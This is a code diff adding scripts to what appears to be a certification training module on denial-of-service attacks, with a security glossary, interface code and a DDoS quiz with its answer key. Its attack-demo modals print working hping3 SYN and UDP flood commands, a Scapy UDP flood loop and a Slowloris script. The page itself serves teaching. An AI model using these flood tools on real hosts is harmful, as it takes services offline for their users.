+     CSP-safe: all wiring via addEventListener; no inline handlers. */
+  var GLOSSARY = {
+    'aes': 'Advanced Encryption Standard \u2014 the modern symmetric cipher, typically with 128- or 256-bit keys.',
+    'arp spoofing': 'Sending forged ARP messages to associate the attacker\'s MAC with another host\'s IP, enabling interception.',
+    'asymmetric encryption': 'Public-key cryptography using a linked key pair \u2014 a public key to encrypt/verify and a private key to decrypt/sign.',
+    'attack surface': 'The total set of points where an attacker could try to enter or extract data from a system.',
+    'availability': 'Ensuring systems and data are accessible to authorized users when needed.',
+    'botnet': 'A network of compromised devices controlled by an attacker, often used to launch DDoS attacks.',
+    'c2': 'Command and Control \u2014 the infrastructure an attacker uses to remotely direct compromised systems.',
+    'cia triad': 'Confidentiality, Integrity, and Availability \u2014 the three core goals of information security.',
+    'confidentiality': 'Ensuring information is readable only by authorized parties, typically via encryption.',
+    'container escape': 'An attack that breaks out of a container\'s isolation to reach the host or other containers.',
+    'csrf': 'Cross-Site Request Forgery \u2014 tricking a logged-in user\'s browser into making an unwanted authenticated request.',
+    'cve': 'Common Vulnerabilities and Exposures \u2014 a public catalog assigning a unique ID to each known vulnerability.',
+    'ddos': 'Distributed Denial of Service \u2014 overwhelming a target with traffic from many sources to make it unavailable.',
+    'deauth': 'A forged Wi-Fi management frame that disconnects a client, often to force a reconnection that yields a handshake.',
+    'defense in depth': 'Layering multiple independent security controls so that if one fails, others still protect the system.',
+    'digital signature': 'Data signed with a private key that anyone can verify with the matching public key, proving origin and integrity.',
+    'directory traversal': 'An attack that uses ../ sequences to access files outside the web server\'s intended directory.',
+    'ecc': 'Elliptic Curve Cryptography \u2014 asymmetric cryptography giving RSA-level security with much smaller keys.',
+    'enumeration': 'Actively extracting detailed information \u2014 usernames, shares, services \u2014 from a target\'s systems.',
+    'evil twin': 'A rogue access point impersonating a legitimate network\'s name to lure victims into connecting.',
+    'exploit': 'Code or a technique that takes advantage of a specific vulnerability to cause unintended behavior.',
+    'harvest now, decrypt later': 'Recording encrypted traffic today to decrypt once quantum computers mature; needs no quantum capability at collection time.',
+    'hashing': 'A one-way function mapping any input to a fixed-size digest; used for integrity checks and password storage.',
+    'iam': 'Identity and Access Management \u2014 the cloud system governing who can do what to which resources.',
+    'idor': 'Insecure Direct Object Reference \u2014 changing a reference (like an ID) to access another user\'s data.',
+    'ids': 'Intrusion Detection System \u2014 monitors network or host activity and alerts on suspected malicious behavior.',
+    'injection': 'A flaw where untrusted input is sent to an interpreter as part of a command or query and executed as code.',
+    'integrity': 'Ensuring data has not been altered; tampering can be detected, typically via hashing.',
+    'ips': 'Intrusion Prevention System \u2014 like an IDS but able to actively block detected malicious traffic.',
+    'jailbreaking': 'Gaining privileged administrative control of an iOS device by removing Apple\'s restrictions.',
+    'lateral movement': 'Moving from one compromised system to others inside a network to reach higher-value targets.',
+    'least privilege': 'Granting every identity only the permissions it needs and no more, to limit the blast radius of a compromise.',
+    'malware': 'Malicious software designed to damage, disrupt, or gain unauthorized access to systems.',
+    'man-in-the-middle': 'An attacker who secretly relays and possibly alters communication between two parties who believe they talk directly.',
+    'mdm': 'Mobile Device Management \u2014 software for centrally securing and enforcing policy on an organization\'s mobile devices.',
+    'mfa': 'Multi-Factor Authentication \u2014 requiring two or more independent proofs of identity to log in.',
+    'non-repudiation': 'A guarantee that a party cannot credibly deny having taken an action, e.g. signing a message.',
+    'owasp': 'Open Web Application Security Project \u2014 a nonprofit best known for its Top 10 lists of critical security risks.',
+    'parameterized query': 'A query that sends SQL code and user data on separate channels so input can never be parsed as code \u2014 the definitive SQLi fix.',
+    'payload': 'The part of an attack that performs the intended malicious action once delivered.',
+    'phishing': 'Fraudulent messages that impersonate a trusted source to steal credentials or deliver malware.',
+    'pki': 'Public Key Infrastructure \u2014 the system of certificates and authorities that binds public keys to verified identities.',
+    'plc': 'Programmable Logic Controller \u2014 a rugged computer that directly controls physical industrial machinery.',
+    'post-quantum cryptography': 'New algorithms (e.g. ML-KEM, ML-DSA) designed to resist attacks from quantum computers.',
+    'pretexting': 'Inventing a fabricated scenario or identity to persuade a victim to divulge information or act.',
+    'privilege escalation': 'Gaining higher permissions than intended \u2014 vertically (to a higher role) or horizontally (to another user\'s resources).',
+    'rainbow table': 'A precomputed table of hashes used to reverse unsalted password hashes quickly.',
+    'ransomware': 'Malware that encrypts a victim\'s data and demands payment for the decryption key.',
+    'reconnaissance': 'The first phase of an attack: gathering information about a target before attempting to breach it.',
+    'rooting': 'Gaining privileged administrative control of an Android device by removing manufacturer restrictions.',
+    'rootkit': 'Malware that hides its presence and maintains privileged access deep in a system.',
+    'rsa': 'A widely used asymmetric algorithm whose security rests on the difficulty of factoring large numbers.',
+    'salt': 'A unique random value added to a password before hashing, defeating precomputed (rainbow-table) attacks.',
+    'sandbox': 'An isolated environment where an app runs without free access to other apps or the system.',
+    'scada': 'Supervisory Control and Data Acquisition \u2014 systems that monitor and control industrial processes.',
+    'session hijacking': 'Taking over a valid user session, typically by stealing or forging the session token.',
+    'shared responsibility model': 'The split where the cloud provider secures the infrastructure and the customer secures their data, configuration, and access.',
+    'siem': 'Security Information and Event Management \u2014 a system that aggregates and correlates logs to detect threats.',
+    'smishing': 'Phishing carried out over SMS text messages, often with malicious links.',
+    'social engineering': 'Manipulating people into revealing information or taking actions that compromise security.',
+    'sql injection': 'Injecting attacker-controlled SQL into a query so the database executes it as code rather than data.',
+    'symmetric encryption': 'Encryption using one shared secret key for both encryption and decryption; fast, ideal for bulk data (e.g. AES).',
+    'threat actor': 'Any individual or group that carries out, or intends to carry out, malicious activity.',
+    'tls': 'Transport Layer Security \u2014 the protocol behind HTTPS; uses asymmetric crypto to exchange a fast symmetric session key.',
+    'trojan': 'Malware disguised as legitimate software to trick a user into installing it.',
+    'vishing': 'Voice phishing \u2014 social engineering conducted over a phone call.',
+    'vulnerability': 'A weakness in a system that an attacker can use to compromise its security.',
+    'waf': 'Web Application Firewall \u2014 filters malicious HTTP requests; a layer of defense, not a substitute for fixing code.',
+    'web shell': 'A malicious script uploaded to a server that gives an attacker remote command execution.',
+    'wpa2': 'A long-standing Wi-Fi security standard using strong AES encryption; vulnerable when the passphrase is weak.',
+    'wpa3': 'The current Wi-Fi security standard, whose SAE handshake resists the offline dictionary attacks that defeat WPA2-PSK.',
+    'xss': 'Cross-Site Scripting \u2014 injecting malicious script into a page so it runs in other users\' browsers.',
+    'zero trust': '\u201cNever trust, always verify\u201d \u2014 a model that treats every request as untrusted regardless of origin and continuously verifies identity and authorization.',
+    'zero-day': 'A vulnerability unknown to the vendor, with no patch available, that attackers can exploit before it is fixed.'
+  };
+
+  var tipEl = null, tipTarget = null, tipHideTimer = null, tipSuppressed = null;
+
+  function ensureTipEl() {
+    if (tipEl) return tipEl;
+    tipEl = document.createElement('div');
+    tipEl.className = 'tooltip-bubble';
+    tipEl.id = 'chassisTooltip';
+    tipEl.setAttribute('role', 'tooltip');
+    tipEl.hidden = true;
+    document.body.appendChild(tipEl);
+    return tipEl;
+  }
+
+  function tipText(el) {
+    var t = el.getAttribute('data-tip');
+    if (t) return t;
+    var key = (el.getAttribute('data-term') || el.textContent || '').trim().toLowerCase();
+    return GLOSSARY[key] || '';
+  }
+
+  function positionTip(target) {
+    var b = ensureTipEl();
+    var r = target.getBoundingClientRect();
+    b.style.left = '0px'; b.style.top = '0px';
+    b.hidden = false;
+    var bw = b.offsetWidth, bh = b.offsetHeight;
+    var margin = 8, vw = document.documentElement.clientWidth;
+    var left = r.left + (r.width / 2) - (bw / 2);
+    left = Math.max(margin, Math.min(left, vw - bw - margin));
+    var top = r.top - bh - 10;
+    var placement = 'top';
+    if (top < margin) { top = r.bottom + 10; placement = 'bottom'; }
+    b.setAttribute('data-placement', placement);
+    b.style.left = (left + window.pageXOffset) + 'px';
+    b.style.top = (top + window.pageYOffset) + 'px';
+    var arrow = r.left + (r.width / 2) - left;
+    b.style.setProperty('--tip-arrow', Math.max(12, Math.min(arrow, bw - 12)) + 'px');
+  }
+
+  function showTip(target) {
+    if (target === tipSuppressed) return;   // just dismissed via Escape; wait for blur
+    var txt = tipText(target);
+    if (!txt) return;
+    if (tipHideTimer) { clearTimeout(tipHideTimer); tipHideTimer = null; }
+    var b = ensureTipEl();
+    b.textContent = txt;
+    if (!target.id) target.id = 'term-' + Math.random().toString(36).slice(2, 8);
+    target.setAttribute('aria-describedby', b.id);
+    tipTarget = target;
+    positionTip(target);
+    b.classList.add('is-visible');
+  }
+
+  function hideTip() {
+    if (!tipEl) return;
+    tipEl.classList.remove('is-visible');
+    if (tipTarget) { tipTarget.removeAttribute('aria-describedby'); tipTarget = null; }
+    tipHideTimer = setTimeout(function () { if (tipEl) tipEl.hidden = true; }, 160);
+  }
+
+  function initTooltips() {
+    // Fill aria-label + focusability for every term so definitions are reachable.
+    var terms = document.querySelectorAll('.term');
+    Array.prototype.forEach.call(terms, function (el) {
+      var txt = tipText(el);
+      if (!txt) return;
+      if (!el.hasAttribute('tabindex')) el.setAttribute('tabindex', '0');
+      el.setAttribute('role', 'button');
+      el.setAttribute('aria-label', el.textContent.trim() + ': ' + txt);
+    });
+
+    document.addEventListener('mouseover', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t) { if (t !== tipSuppressed) tipSuppressed = null; showTip(t); }
+    });
+    document.addEventListener('mouseout', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t && !(e.relatedTarget && el_closest(e.relatedTarget, '.term') === t)) hideTip();
+    });
+    document.addEventListener('focusin', function (e) {
+      var t = el_closest(e.target, '.term'); if (t) showTip(t);
+    });
+    document.addEventListener('focusout', function (e) {
+      if (el_closest(e.target, '.term')) { tipSuppressed = null; hideTip(); }
+    });
+    // Tap toggle on touch / click (the delegated onClick handles data-action separately).
+    document.addEventListener('click', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t) { e.preventDefault(); tipSuppressed = null; if (tipTarget === t) hideTip(); else showTip(t); return; }
+      if (tipTarget && !el_closest(e.target, '.tooltip-bubble')) hideTip();
+    });
+    window.addEventListener('scroll', function () { if (tipTarget) positionTip(tipTarget); }, true);
+    window.addEventListener('resize', function () { if (tipTarget) positionTip(tipTarget); });
+  }
+
+  /* ---------- init ---------- */
+  function init(config) {
+    config = config || {};
+    sectionOrder = config.sections ||
+      Array.prototype.map.call(document.querySelectorAll('.module-section'), function (s) { return s.id; });
+
+    applyTheme(prefs.theme || systemTheme());
+    applyScale(typeof prefs.scaleIndex === 'number' ? prefs.scaleIndex : 1);
+
+    var saved = getState();
+    visited = Array.isArray(saved.visited) ? saved.visited.filter(function (v) {
+      return sectionOrder.indexOf(v) !== -1;
+    }) : [];
+
+    document.addEventListener('click', onClick);
+    document.addEventListener('keydown', onGlobalKey);
+    var nav = document.querySelector('.navigation');
+    if (nav) nav.addEventListener('keydown', onNavKey);
+
+    var themeBtn = document.getElementById('themeToggle');
+    if (themeBtn) themeBtn.addEventListener('click', function () {
+      setTheme(document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+    });
+    var dec = document.getElementById('fontDec');
+    var inc = document.getElementById('fontInc');
+    if (dec) dec.addEventListener('click', function () { setScale(prefs.scaleIndex - 1); });
+    if (inc) inc.addEventListener('click', function () { setScale(prefs.scaleIndex + 1); });
+    var pr = document.getElementById('printBtn');
+    if (pr) pr.addEventListener('click', function () { window.print(); });
+
+    // notes wiring
+    var notesToggle = document.getElementById('notesToggle');
+    if (notesToggle) notesToggle.addEventListener('click', toggleNotes);
+    var notesClose = document.getElementById('notesClose');
+    if (notesClose) notesClose.addEventListener('click', closeNotes);
+    var notesArea = document.getElementById('notesArea');
+    if (notesArea) notesArea.addEventListener('input', onNotesInput);
+    var tabSec = document.getElementById('notesTabSection');
+    if (tabSec) tabSec.addEventListener('click', function () { setNotesScope('section'); });
+    var tabScr = document.getElementById('notesTabScratch');
+    if (tabScr) tabScr.addEventListener('click', function () { setNotesScope('scratch'); });
+    var notesExport = document.getElementById('notesExport');
+    if (notesExport) notesExport.addEventListener('click', exportNotes);
+    var notesClear = document.getElementById('notesClear');
+    if (notesClear) notesClear.addEventListener('click', clearScopeNotes);
+
+    var modal = document.getElementById('detailModal');
+    if (modal) modal.addEventListener('click', function (e) { if (e.target === modal) closeModal(); });
+
+    var hashSec = (window.location.hash || '').replace(/^#/, '');
+    var resume = (hashSec && sectionOrder.indexOf(hashSec) !== -1) ? hashSec
+      : (saved.current && sectionOrder.indexOf(saved.current) !== -1
+        ? saved.current : sectionOrder[0]);
+    showSection(resume, { silent: true });
+    updateProgress();
+    matrixEffect();
+    initTooltips();
+    updateNotesIndicator();
+
+    if (visited.length > 1) {
+      notify('Welcome back — resuming where you left off.');
+    }
+    if (typeof config.onReady === 'function') config.onReady();
+  }
+
+  return {
+    init: init, register: register,
+    showSection: showSection, step: step,
+    openModal: openModal, showModal: showModal, closeModal: closeModal,
+    notify: notify, announce: announce,
+    getState: getState, setState: setState,
+    updateProgress: updateProgress,
+    openNotes: openNotes, closeNotes: closeNotes, exportNotes: exportNotes
+  };
+})();
+
+</script>
+<script>
+(function () {
+  'use strict';
+
+  /* ---- module-specific behaviour (preserved from the original build) ---- */
+/* shims for behaviour the chassis now owns */
+  function navigateSection(direction) { CEH.step(direction); }
+  function showModal(a, b) { CEH.showModal(a, b); }
+
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'dos-concepts', 'attack-types', 'botnets', 'tools', 'detection', 'countermeasures', 'case-studies', 'quiz', 'resources'];
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+        let totalStudyTime = 0;
+
+        // Quiz questions database
+        const quizQuestions = [
+            {
+                question: "What is the primary difference between a DoS and DDoS attack?",
+                options: [
+                    "DoS attacks are more powerful than DDoS attacks",
+                    "DoS uses a single source, DDoS uses multiple distributed sources",
+                    "DDoS attacks only target web servers",
+                    "There is no significant difference"
+                ],
+                correct: 1,
+                explanation: "The key difference is that DoS attacks originate from a single source, while DDoS (Distributed DoS) attacks use multiple compromised systems (botnet) to amplify the attack power."
+            },
+            {
+                question: "Which type of DDoS attack primarily aims to consume network bandwidth?",
+                options: [
+                    "Protocol attacks",
+                    "Application layer attacks", 
+                    "Volumetric attacks",
+                    "Amplification attacks"
+                ],
+                correct: 2,
+                explanation: "Volumetric attacks focus on consuming the bandwidth of the target network or service by generating massive amounts of traffic, typically measured in bits per second (bps)."
+            },
+            {
+                question: "What is the primary mechanism behind a SYN flood attack?",
+                options: [
+                    "Sending large ICMP packets to overwhelm the target",
+                    "Exploiting the TCP three-way handshake by not completing connections",
+                    "Flooding the target with UDP packets on random ports",
+                    "Consuming bandwidth with large file downloads"
+                ],
+                correct: 1,
+                explanation: "SYN flood attacks exploit the TCP handshake by sending SYN packets with spoofed source IPs, causing the server to keep half-open connections in memory while waiting for ACK packets that never arrive."
+            },
+            {
+                question: "Which protocol offers the highest amplification factor in reflection attacks?",
+                options: [
+                    "DNS (179x amplification)",
+                    "NTP (556x amplification)",
+                    "SNMP (650x amplification)",
+                    "Memcached (51,200x amplification)"
+                ],
+                correct: 3,
+                explanation: "Memcached amplification attacks can achieve amplification factors of up to 51,200x, making them extremely dangerous. This was demonstrated in the 2018 GitHub attack."
+            },
+            {
+                question: "What was significant about the Mirai botnet?",
+                options: [
+                    "It was the first DDoS attack ever recorded",
+                    "It primarily targeted IoT devices with default credentials",
+                    "It only used Windows computers for attacks",
+                    "It was created by government agencies"
+                ],
+                correct: 1,
+                explanation: "Mirai revolutionized DDoS attacks by targeting IoT devices (cameras, routers, DVRs) that used default or weak credentials, creating massive botnets of up to 400,000 devices."
+            },
+            {
+                question: "Which attack technique involves maintaining many partial HTTP connections?",
+                options: [
+                    "HTTP Flood",
+                    "Slowloris",
+                    "SYN Flood", 
+                    "UDP Flood"
+                ],
+                correct: 1,
+                explanation: "Slowloris attacks maintain many partial HTTP connections by sending incomplete HTTP requests and periodically sending additional headers, never completing the requests to exhaust server connection pools."
+            },
+            {
+                question: "What is the primary advantage of using a P2P (peer-to-peer) botnet topology?",
+                options: [
+                    "Faster command distribution",
+                    "Lower bandwidth requirements",
+                    "No single point of failure",
+                    "Easier to manage and control"
+                ],
+                correct: 2,
+                explanation: "P2P botnet topology eliminates the single point of failure present in centralized C&C architectures, making the botnet more resilient to takedown efforts."
+            },
+            {
+                question: "Which metric is most important when measuring volumetric attacks?",
+                options: [
+                    "Requests per second (rps)",
+                    "Packets per second (pps)",
+                    "Bits per second (bps)",
+                    "Connections per second (cps)"
+                ],
+                correct: 2,
+                explanation: "Volumetric attacks are primarily measured in bits per second (bps) as they focus on consuming network bandwidth. Protocol attacks use pps, and application attacks use rps."
+            },
+            {
+                question: "What is the main purpose of traffic scrubbing in DDoS mitigation?",
+                options: [
+                    "To increase network bandwidth",
+                    "To filter out malicious traffic and forward only legitimate requests",
+                    "To encrypt all network communications",
+                    "To compress data to reduce bandwidth usage"
+                ],
+                correct: 1,
+                explanation: "Traffic scrubbing centers analyze incoming traffic, filter out malicious requests, and forward only legitimate traffic to the protected servers."
+            },
+            {
+                question: "Which detection method is most effective against zero-day DDoS attacks?",
+                options: [
+                    "Signature-based detection",
+                    "Rule-based filtering",
+                    "Behavioral analysis and machine learning",
+                    "Manual traffic inspection"
+                ],
+                correct: 2,
+                explanation: "Behavioral analysis and machine learning can detect previously unknown attack patterns by identifying deviations from normal traffic behavior, making them effective against zero-day attacks."
+            },
+            {
+                question: "What was the peak traffic volume of the 2018 GitHub DDoS attack?",
+                options: [
+                    "665 Gbps",
+                    "1.2 Tbps",
+                    "1.35 Tbps",
+                    "2.3 Tbps"
+                ],
+                correct: 2,
+                explanation: "The 2018 GitHub attack reached 1.35 Tbps using memcached amplification, making it one of the largest recorded DDoS attacks at the time."
+            },
+            {
+                question: "Which botnet was responsible for the 2016 Dyn DNS attack?",
+                options: [
+                    "Conficker",
+                    "Zeus",
+                    "Mirai",
+                    "Kelihos"
+                ],
+                correct: 2,
+                explanation: "The Mirai botnet was responsible for the October 2016 Dyn DNS attack that disrupted major websites including Twitter, Netflix, and PayPal."
+            },
+            {
+                question: "What is the primary goal of application layer (Layer 7) DDoS attacks?",
+                options: [
+                    "Consume network bandwidth",
+                    "Overwhelm routing tables",
+                    "Exhaust application resources and services",
+                    "Corrupt network packets"
+                ],
+                correct: 2,
+                explanation: "Layer 7 attacks target specific applications and services, aiming to exhaust server resources like CPU, memory, and database connections rather than just consuming bandwidth."
+            },
+            {
+                question: "Which technique is commonly used to make DDoS attacks appear to come from legitimate sources?",
+                options: [
+                    "IP spoofing",
+                    "DNS poisoning",
+                    "ARP spoofing",
+                    "MAC flooding"
+                ],
+                correct: 0,
+                explanation: "IP spoofing is used to forge source IP addresses, making attack traffic appear to come from legitimate sources or to enable reflection/amplification attacks."
+            },
+            {
+                question: "What is the typical cost range for hiring a DDoS attack service for one hour?",
+                options: [
+                    "$1-$2",
+                    "$5-$10",
+                    "$50-$100",
+                    "$500-$1000"
+                ],
+                correct: 1,
+                explanation: "DDoS-for-hire services typically charge $5-$10 per hour for basic attacks, making DDoS attacks accessible to low-skill attackers through the cybercrime-as-a-service model."
+            },
+            {
+                question: "Which characteristic distinguishes protocol attacks from volumetric attacks?",
+                options: [
+                    "Protocol attacks use more bandwidth",
+                    "Protocol attacks exploit network protocol weaknesses and state tables",
+                    "Protocol attacks are easier to detect",
+                    "Protocol attacks only target web servers"
+                ],
+                correct: 1,
+                explanation: "Protocol attacks exploit weaknesses in network protocols and target state tables in network infrastructure components, while volumetric attacks focus on consuming bandwidth."
+            },
+            {
+                question: "What is the recommended approach for DDoS protection strategy?",
+                options: [
+                    "Rely solely on ISP filtering",
+                    "Use only cloud-based protection",
+                    "Implement a multi-layered defense-in-depth approach",
+                    "Focus only on bandwidth over-provisioning"
+                ],
+                correct: 2,
+                explanation: "Effective DDoS protection requires a multi-layered defense-in-depth strategy combining prevention, detection, mitigation, response, and recovery across all network layers."
+            },
+            {
+                question: "Which phase of a botnet lifecycle involves malware distribution and initial system compromise?",
+                options: [
+                    "Registration & Communication",
+                    "Initial Compromise",
+                    "Maintenance & Updates",
+                    "Monetization"
+                ],
+                correct: 1,
+                explanation: "Initial Compromise is the first phase where systems are infected through various methods like phishing, drive-by downloads, or exploiting vulnerabilities."
+            },
+            {
+                question: "What is the primary advantage of using CDN (Content Delivery Network) for DDoS protection?",
+                options: [
+                    "Faster website loading times",
+                    "Better SEO rankings",
+                    "Distributed traffic absorption and geographic load distribution",
+                    "Reduced hosting costs"
+                ],
+                correct: 2,
+                explanation: "CDNs provide DDoS protection by distributing traffic across multiple geographic locations, absorbing attack traffic, and maintaining service availability through their global infrastructure."
+            },
+            {
+                question: "Which tool is specifically designed for application layer DoS testing and demonstrates low-bandwidth attacks?",
+                options: [
+                    "hping3",
+                    "Nmap",
+                    "Slowloris",
+                    "Apache Bench"
+                ],
+                correct: 2,
+                explanation: "Slowloris is specifically designed to demonstrate application layer DoS attacks by maintaining many partial HTTP connections with minimal bandwidth usage, making it an effective low-bandwidth attack tool."
+            }
+        ];
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', function() {
+            CEH.showSection('overview');
+            CEH.updateProgress();
+            
+            // Add keyboard navigation
+            document.addEventListener('keydown', handleKeyPress);
+        });
+
+        // Navigation functions
+        
+
+        // Keyboard navigation
+        
+function handleKeyPress(event) {
+            if (event.key === 'Escape') {
+                CEH.closeModal();
+            } else if (event.key === 'ArrowLeft') {
+                navigateSection(-1);
+            } else if (event.key === 'ArrowRight') {
+                navigateSection(1);
+            }
+        }
+
+        // Quiz functions
+        
+function generateQuiz() {
+            const container = document.getElementById('quizContainer');
+            container.innerHTML = '';
+            
+            quizQuestions.forEach((q, index) => {
+                const questionDiv = document.createElement('div');
+                questionDiv.className = 'question';
+                questionDiv.innerHTML = `
+                    <h4>Question ${index + 1}: ${q.question}</h4>
+                    <div class="options">
+                        ${q.options.map((option, optIndex) => `
+                            <label>
+                                <input type="radio" name="q${index}" value="${optIndex}">
+                                ${option}
+                            </label>
+                        `).join('')}
+                    </div>
+                `;
+                container.appendChild(questionDiv);
+            });
+            
+            // Add submit button
+            const submitBtn = document.createElement('button');
+            submitBtn.className = 'btn btn-success';
+            submitBtn.textContent = 'Submit Quiz';
+            submitBtn.onclick = submitQuiz;
+            container.appendChild(submitBtn);
+        }
+function submitQuiz() {
+            let correct = 0;
+            const results = [];
+            
+            quizQuestions.forEach((q, index) => {
+                const selected = document.querySelector(`input[name="q${index}"]:checked`);
+                if (selected) {
+                    const answer = parseInt(selected.value);
+                    quizAnswers[index] = answer;
+                    
+                    if (answer === q.correct) {
+                        correct++;
+                        results.push({
+                            question: index + 1,
+                            correct: true,
+                            explanation: q.explanation
+                        });
+                    } else {
+                        results.push({
+                            question: index + 1,
+                            correct: false,
+                            selected: q.options[answer],
+                            correctAnswer: q.options[q.correct],
+                            explanation: q.explanation
+                        });
+                    }
+                }
+            });
+            
+            quizScore = (correct / quizQuestions.length) * 100;
+            displayResults(results, correct, quizQuestions.length);
+        }
+function displayResults(results, correct, total) {
+            const resultsDiv = document.getElementById('quizResults');
+            const percentage = Math.round((correct / total) * 100);
+            
+            let resultHTML = `
+                <div style="text-align: center; margin: 20px 0;">
+                    <div style="font-size: 3em; font-weight: bold; color: ${percentage >= 80 ? '#27ae60' : '#e74c3c'};">
+                        ${percentage}%
+                    </div>
+                    <div style="font-size: 1.2em; margin: 10px 0;">
+                        ${correct} out of ${total} questions correct
+                    </div>
+                    <div style="padding: 15px; background: ${percentage >= 80 ? 'var(--gradient-success)' : 'var(--gradient-danger)'}; color: white; border-radius: 10px; margin: 20px 0;">
+                        ${percentage >= 80 ? '🎉 Congratulations! You passed!' : '📚 Keep studying and try again!'}
+                    </div>
+                </div>
+                
+                <h4>📊 Detailed Results:</h4>
+            `;
+            
+            results.forEach(result => {
+                resultHTML += `
+                    <div style="margin: 15px 0; padding: 15px; border-radius: 8px; background: ${result.correct ? '#d4edda' : '#f8d7da'}; border-left: 4px solid ${result.correct ? '#28a745' : '#dc3545'};">
+                        <strong>Question ${result.question}: ${result.correct ? '✅ Correct' : '❌ Incorrect'}</strong>
+                        ${!result.correct ? `
+                            <br><strong>Your answer:</strong> ${result.selected}
+                            <br><strong>Correct answer:</strong> ${result.correctAnswer}
+                        ` : ''}
+                        <br><strong>Explanation:</strong> ${result.explanation}
+                    </div>
+                `;
+            });
+            
+            document.getElementById('resultsContent').innerHTML = resultHTML;
+            resultsDiv.style.display = 'block';
+            
+            // Scroll to results
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Modal functions
+        
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                CEH.closeModal();
+            }
+        }
+
+        // Utility functions
+        
+function calculateStudyTime() {
+            totalStudyTime = Math.round((Date.now() - startTime) / 1000 / 60); // minutes
+            return totalStudyTime;
+        }
+function resetQuiz() {
+            quizAnswers = {};
+            quizScore = 0;
+            document.getElementById('quizResults').style.display = 'none';
+            generateQuiz();
+        }
+
+        // Auto-save progress
+        setInterval(() => {
+            localStorage.setItem('ceh_module10_progress', JSON.stringify({
+                completedSections: Array.from(completedSections),
+                currentSection: currentSection,
+                studyTime: calculateStudyTime(),
+                quizScore: quizScore
+            }));
+        }, 30000); // Save every 30 seconds
+
+        // Load saved progress
+        
+function loadProgress() {
+            const saved = localStorage.getItem('ceh_module10_progress');
+            if (saved) {
+                const progress = JSON.parse(saved);
+                completedSections = new Set(progress.completedSections);
+                if (progress.currentSection) {
+                    currentSection = progress.currentSection;
+                }
+                if (progress.studyTime) {
+                    totalStudyTime = progress.studyTime;
+                }
+                if (progress.quizScore) {
+                    quizScore = progress.quizScore;
+                }
+                CEH.updateProgress();
+            }
+        }
+
+        // Initialize progress loading
+        document.addEventListener('DOMContentLoaded', function() {
+            loadProgress();
+        });
+
+        // Additional helper functions for enhanced interactivity
+        
+function showAttackDemo(attackType) {
+            let content = '';
+            
+            switch(attackType) {
+                case 'syn_flood':
+                    content = `
+                        <h3>🎯 SYN Flood Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Attack Simulation (Educational Only)</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Simulated SYN flood using hping3<br>
+# WARNING: Only use on authorized systems<br>
+<br>
+# Basic SYN flood<br>
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com<br>
+<br>
+# Parameters explanation:<br>
+# -c: packet count<br>
+# -d: data size<br>
+# -S: SYN flag<br>
+# -w: window size<br>
+# -p: target port<br>
+# --flood: send packets as fast as possible<br>
+# --rand-source: randomize source IP
+                            </div>
+                            <p><strong>Detection Signs:</strong></p>
+                            <ul>
+                                <li>High number of SYN_RECV connections</li>
+                                <li>Server connection table filling up</li>
+                                <li>Increased memory usage</li>
+                                <li>New connection rejections</li>
+                            </ul>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'udp_flood':
+                    content = `
+                        <h3>🎯 UDP Flood Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Attack Mechanism</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# UDP flood using hping3<br>
+hping3 -2 -c 10000 -d 120 -p 53 --flood target.com<br>
+<br>
+# Using Scapy for custom UDP flood<br>
+from scapy.all import *<br>
+<br>
+def udp_flood(target, port, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;for i in range(count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(dst=target)/UDP(dport=port)/Raw(load="X"*1024)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send(packet, verbose=0)
+                            </div>
+                            <p><strong>Impact:</strong> Consumes bandwidth and forces target to respond with ICMP Destination Unreachable messages.</p>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'slowloris':
+                    content = `
+                        <h3>🎯 Slowloris Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Low-Bandwidth Application Layer Attack</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Basic Slowloris concept<br>
+import socket<br>
+import time<br>
+import threading<br>
+<br>
+def slowloris_connection(target, port):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.connect((target, port))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.send("GET / HTTP/1.1\\r\\n".encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.send("Host: {}\\r\\n".format(target).encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Keep connection alive with partial headers<br>
+&nbsp;&nbsp;&nbsp;&nbsp;while True:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sock.send("X-a: b\\r\\n".encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(15)
+                            </div>
+                            <p><strong>Effectiveness:</strong> Can take down web servers with minimal bandwidth using just hundreds of connections.</p>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Attack Demonstration', content);
+        }
